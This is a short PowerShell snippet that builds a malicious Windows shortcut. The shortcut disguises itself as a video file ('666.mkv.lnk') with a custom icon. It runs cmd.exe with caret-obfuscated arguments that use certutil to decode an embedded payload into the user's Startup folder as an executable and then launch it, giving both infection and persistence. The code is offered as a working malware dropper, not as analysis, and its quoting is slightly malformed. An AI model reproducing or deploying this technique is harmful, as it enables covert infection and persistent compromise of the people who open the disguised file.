$WshShell=New-Object -ComObject WScript.Shell
$Shortcut=$WshShell.CreateShortcut($Output)
$Shortcut.TargetPath="cmd.exe"
$Shortcut.Arguments=/c ^c^m^d /c certutil -decode c:\Users\Etern\Desktop\666.mkv.lnk %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%USERNAME%.exe" nul 2>&1 && "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%USERNAME%.exe
$Shortcut.IconLocation=$Icon
$Shortcut.Save()